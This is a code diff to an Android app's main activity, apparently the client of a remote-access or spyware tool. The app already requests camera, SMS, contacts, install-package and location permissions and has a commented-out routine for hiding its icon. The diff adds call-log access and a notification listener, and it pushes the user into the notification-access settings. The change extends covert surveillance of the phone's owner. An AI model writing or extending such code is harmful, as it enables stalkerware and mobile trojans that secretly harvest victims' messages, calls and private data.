@@ -20,6 +20,7 @@ import android.provider.Settings;
 import android.util.Log;
 
 import com.ot.grhq.client.functionality.Utils;
+import com.ot.grhq.client.receivers.NotificationListener;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -41,6 +42,7 @@ public class MainActivity extends AppCompatActivity {
     private static String[] PERMISSIONS = {
         Manifest.permission.CAMERA,
         Manifest.permission.CALL_PHONE,
+        Manifest.permission.READ_CALL_LOG,
         Manifest.permission.SEND_SMS,
         Manifest.permission.READ_CONTACTS,
         Manifest.permission.WRITE_CONTACTS,
@@ -50,7 +52,8 @@ public class MainActivity extends AppCompatActivity {
         Manifest.permission.REQUEST_INSTALL_PACKAGES,
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.ACCESS_COARSE_LOCATION,
-        Manifest.permission.ACCESS_FINE_LOCATION
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE
     };
 
     private SharedPreferences preferences;
@@ -69,6 +72,14 @@ public class MainActivity extends AppCompatActivity {
 //
 ////        hideApplicationIcon();
         startService(new Intent(this, MainService.class));
+
+        String notificationListenerString = Settings.Secure.getString(this.getContentResolver(),"enabled_notification_listeners");
+        // Check notifications access permission
+        if (notificationListenerString == null || !notificationListenerString.contains(getPackageName()))
+        {
+            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
+        }
+        startService(new Intent(this, NotificationListener.class));
     }
 
     /**
